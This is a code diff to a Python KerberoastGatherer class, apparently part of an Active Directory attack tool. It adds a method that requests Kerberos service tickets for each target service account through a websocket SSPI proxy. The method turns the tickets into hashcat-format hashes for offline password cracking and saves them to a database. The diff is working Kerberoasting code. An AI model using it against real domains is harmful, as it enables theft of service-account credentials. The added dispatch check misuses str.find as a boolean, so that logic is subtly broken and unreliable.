@@ -173,6 +173,50 @@ class KerberoastGatherer:
 			self.session.commit()
 		except Exception as e:
 			return None, e
+
+	async def kerberoast_sspiproxy(self):
+		try:
+			from pyodidewsnet.sspiproxyws import SSPIProxyWS
+			
+			url = self.kerb_url
+			agentid = None
+			o = urlparse(self.kerb_url)
+			if o.query:
+				q = parse_qs(o.query)
+				agentid = q.get('agentid', [None])[0]
+				if agentid is not None:
+					agentid = bytes.fromhex(agentid)
+			
+			for uid in self.targets_spn:
+				if self.targets_spn[uid].get_formatted_pname().lower().startswith('krbtgt'):
+					continue
+				sspi = SSPIProxyWS(url, agentid)
+				status, ctxattr, apreq, err = await sspi.authenticate('KERBEROS', '', self.targets_spn[uid].get_formatted_pname(), 3, 2048, authdata = b'')
+				if err is not None:
+					print(err.__traceback__)
+					print('Failed to get ticket for %s Reason: %s' % (self.targets_spn[uid].get_formatted_pname(), str(err)))
+					continue
+				
+				unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(apreq)
+				aprep = AP_REQ.load(unwrap.data[2:]).native
+				t = KerberoastTable.from_hash(self.ad_id, uid, TGSTicket2hashcat(aprep))
+				self.session.add(t)
+
+				self.total_targets_finished += 1
+				if self.progress_queue is not None:
+					msg = GathererProgress()
+					msg.type = GathererProgressType.KERBEROAST
+					msg.msg_type = MSGTYPE.PROGRESS 
+					msg.adid = self.ad_id
+					msg.domain_name = self.domain_name
+					msg.total = self.total_targets
+					msg.total_finished = self.total_targets_finished
+					msg.step_size = 1
+					await self.progress_queue.put(msg)
+
+			self.session.commit()
+		except Exception as e:
+			return None, e
 	
 	async def kerberoast(self):
 		try:
@@ -281,7 +325,10 @@ class KerberoastGatherer:
 					raise err
 			
 			elif self.kerb_url.startswith('ws'):
-				await self.kerberoast_multiplexor()
+				if self.kerb_url.find('type=sspiproxy'):
+					await self.kerberoast_sspiproxy()
+				else:
+					await self.kerberoast_multiplexor()
 
 			return True, None
 		except Exception as e:
